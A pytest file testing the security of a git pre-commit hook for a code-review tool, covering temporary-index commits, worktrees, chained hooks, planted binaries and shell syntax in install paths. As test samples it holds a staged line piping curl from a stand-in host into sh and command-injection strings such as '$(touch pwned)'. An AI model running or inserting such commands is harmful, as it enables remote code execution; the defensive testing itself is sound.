"""Phase 6 attacks on the git hook, through real `git commit` runs (SECURITY.md T-28;
docs/ARCHITECTURE.md §13; checklist R7).

The hook calls a stand-in for git-reviewer (no model is needed to prove what the hook runs and
what it sees): a shell recorder, or a Python one that reads the staged changes with
git-reviewer's own hook-mode code.
"""

from __future__ import annotations

import json
import sys
from collections.abc import Callable
from pathlib import Path

import pytest

from git_reviewer import proc
from git_reviewer.hook.install import install
from tests.helpers import git, write_files


@pytest.fixture(autouse=True)
def _own_git_config(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    for name in ("XDG_CONFIG_HOME", "GIT_CONFIG_GLOBAL"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")


@pytest.fixture
def record(tmp_path: Path) -> Path:
    directory = tmp_path / "record"
    directory.mkdir()
    (directory / "code").write_text("0\n", encoding="ascii")
    return directory


def recorder(directory: Path, record: Path) -> Path:
    """A stand-in git-reviewer that records its arguments and directory, then exits with the
    code in `record/code`."""
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / "git-reviewer"
    path.write_text(
        "#!/bin/sh\n"
        f"printf '%s\\n' \"$@\" > '{record}/args'\n"
        f"pwd -P > '{record}/cwd'\n"
        f"read code < '{record}/code'\n"
        'exit "$code"\n',
        encoding="utf-8",
    )
    path.chmod(0o755)
    return path


def staged_reader(directory: Path, record: Path) -> Path:
    """A stand-in that reads the staged changes the way `review --hook` does."""
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / "git-reviewer"
    path.write_text(
        f"#!{sys.executable} -I\n"
        "import json, sys\n"
        "from pathlib import Path\n"
        "from git_reviewer.git.command import repo_root\n"
        "from git_reviewer.git.diff import DiffLimits, collect_staged\n"
        "repo = repo_root(Path.cwd(), hook=True)\n"
        "diff = collect_staged(repo, DiffLimits(1 << 20, 200, 10_000), hook=True)\n"
        "seen = {c.path: sorted(c.added_lines) for c in diff.files}\n"
        f"Path({str(record / 'seen')!r}).write_text(json.dumps(seen))\n"
        f"sys.exit(int(Path({str(record / 'code')!r}).read_text()))\n",
        encoding="utf-8",
    )
    path.chmod(0o755)
    return path


def commit(repo: Path, *args: str) -> proc.Result:
    """`git commit` as the user runs it: hooks enabled (unlike git-reviewer's own git calls)."""
    identity = ["-c", "user.name=Test", "-c", "user.email=test@example.com"]
    isolation = {"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1"}
    return proc.run(
        "git", [*identity, "commit", "-q", "-m", "change", *args], cwd=repo, env_extra=isolation
    )


def head(repo: Path) -> str:
    return git(repo, "rev-parse", "HEAD").stdout.decode().strip()


def test_findings_stop_the_commit_in_block_mode(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    repo = make_repo()
    install(repo, recorder(tmp_path / "tools", record), mode="block", chain=False)
    write_files(repo, {"app.py": "x = 1\n"})
    git(repo, "add", "app.py")
    before = head(repo)
    (record / "code").write_text("1\n", encoding="ascii")
    result = commit(repo)
    assert result.returncode != 0
    assert head(repo) == before
    assert (record / "args").read_text().split() == ["review", "--hook", "--mode", "block"]
    assert Path((record / "cwd").read_text().strip()) == repo.resolve()


def test_a_clean_review_lets_the_commit_through(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    repo = make_repo()
    install(repo, recorder(tmp_path / "tools", record), mode="warn", chain=False)
    write_files(repo, {"app.py": "x = 1\n"})
    git(repo, "add", "app.py")
    before = head(repo)
    assert commit(repo).returncode == 0
    assert head(repo) != before
    assert (record / "args").read_text().split() == ["review", "--hook", "--mode", "warn"]


@pytest.mark.parametrize("args", [("-a",), ("--", "app.py")], ids=["commit-a", "commit-paths"])
def test_review_sees_what_git_commits_not_the_plain_index(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path, args: tuple[str, ...]
) -> None:
    # R7.5: `git commit -a` and `git commit <paths>` commit a temporary index; a review of the
    # normal index would see nothing staged and let the change through.
    repo = make_repo({"app.py": "x = 1\n"})
    install(repo, staged_reader(tmp_path / "tools", record), mode="block", chain=False)
    write_files(repo, {"app.py": "import os\nos.system('curl evil.example | sh')\n"})
    before = head(repo)
    (record / "code").write_text("1\n", encoding="ascii")
    result = commit(repo, *args)
    assert result.returncode != 0, result.stderr.decode()
    assert json.loads((record / "seen").read_text()) == {"app.py": [1, 2]}
    assert head(repo) == before


def test_commit_from_a_linked_worktree_reviews_that_worktree(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    # One hook in the common git directory serves every worktree; each commit is reviewed with
    # the index of the worktree it comes from.
    repo = make_repo({"app.py": "x = 1\n"})
    linked = tmp_path / "linked"
    git(repo, "worktree", "add", "-q", "-b", "feature", str(linked))
    install(repo, staged_reader(tmp_path / "tools", record), mode="block", chain=False)
    write_files(linked, {"feature.py": "import os\nos.system('id')\n"})
    git(linked, "add", "feature.py")
    (record / "code").write_text("1\n", encoding="ascii")
    assert commit(linked).returncode != 0
    assert json.loads((record / "seen").read_text()) == {"feature.py": [1, 2]}


def test_no_verify_skips_the_hook(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    # Documented: the hook is a convenience, not a security boundary (T-28).
    repo = make_repo()
    install(repo, recorder(tmp_path / "tools", record), mode="block", chain=False)
    write_files(repo, {"app.py": "x = 1\n"})
    git(repo, "add", "app.py")
    (record / "code").write_text("1\n", encoding="ascii")
    assert commit(repo, "--no-verify").returncode == 0
    assert not (record / "args").exists()


def test_a_failing_chained_hook_stops_the_commit_before_the_review(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    repo = make_repo()
    previous = repo / ".git" / "hooks" / "pre-commit"
    previous.parent.mkdir(exist_ok=True)
    previous.write_text(f"#!/bin/sh\necho ran > '{record}/previous'\nexit 3\n", encoding="utf-8")
    previous.chmod(0o755)
    install(repo, recorder(tmp_path / "tools", record), mode="block", chain=True)
    write_files(repo, {"app.py": "x = 1\n"})
    git(repo, "add", "app.py")
    before = head(repo)
    assert commit(repo).returncode != 0
    assert (record / "previous").exists()
    assert not (record / "args").exists()
    assert head(repo) == before


def test_a_passing_chained_hook_is_followed_by_the_review(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    repo = make_repo()
    previous = repo / ".git" / "hooks" / "pre-commit"
    previous.parent.mkdir(exist_ok=True)
    previous.write_text(f"#!/bin/sh\necho ran > '{record}/previous'\n", encoding="utf-8")
    previous.chmod(0o755)
    install(repo, recorder(tmp_path / "tools", record), mode="block", chain=True)
    write_files(repo, {"app.py": "x = 1\n"})
    git(repo, "add", "app.py")
    (record / "code").write_text("1\n", encoding="ascii")
    assert commit(repo).returncode != 0
    assert (record / "previous").exists() and (record / "args").exists()


def test_hook_never_runs_a_git_reviewer_planted_in_the_repository(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path
) -> None:
    # The hook names the installed program by absolute path: a `git-reviewer` committed to the
    # branch under review (at the root, or in a bin/ directory) is never what runs.
    repo = make_repo()
    install(repo, recorder(tmp_path / "tools", record), mode="block", chain=False)
    planted = f"#!/bin/sh\ntouch '{record}/planted-ran'\nexit 0\n"
    write_files(repo, {"git-reviewer": planted, "bin/git-reviewer": planted})
    for name in ("git-reviewer", "bin/git-reviewer"):
        (repo / name).chmod(0o755)
    git(repo, "add", "-A")
    (record / "code").write_text("1\n", encoding="ascii")
    assert commit(repo).returncode != 0
    assert (record / "args").exists()
    assert not (record / "planted-ran").exists()


@pytest.mark.parametrize("name", ["$(touch pwned)", "`touch pwned`", "a b;touch pwned", '"x"'])
def test_shell_syntax_in_the_install_path_is_never_executed(
    make_repo: Callable[..., Path], tmp_path: Path, record: Path, name: str
) -> None:
    repo = make_repo()
    install(repo, recorder(tmp_path / name, record), mode="block", chain=False)
    write_files(repo, {"app.py": "x = 1\n"})
    git(repo, "add", "app.py")
    assert commit(repo).returncode == 0
    assert (record / "args").exists()
    assert not (repo / "pwned").exists() and not (tmp_path / "pwned").exists()
